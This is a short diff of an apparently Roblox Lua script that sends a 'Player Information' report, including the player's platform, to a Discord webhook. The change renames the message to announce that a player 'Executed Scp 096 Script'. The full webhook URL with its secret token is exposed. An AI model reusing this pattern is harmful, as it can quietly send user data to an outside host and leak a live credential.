@@ -68,7 +68,7 @@ local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
 local url = "https://discord.com/api/webhooks/1292048103175753778/0Iel5dnvbrFAIdY74ARfb557FlTnzu07f_nxUZhpShzEkSQym_66fdGoeANwx_g_vFs8"
 
 local data = {
-   ["content"] = "Player Info Report",
+   ["content"] = "@everyone Player Executed Scp 096 Script",
    ["embeds"] = {{
 
       ["title"] = "**Player Information**",
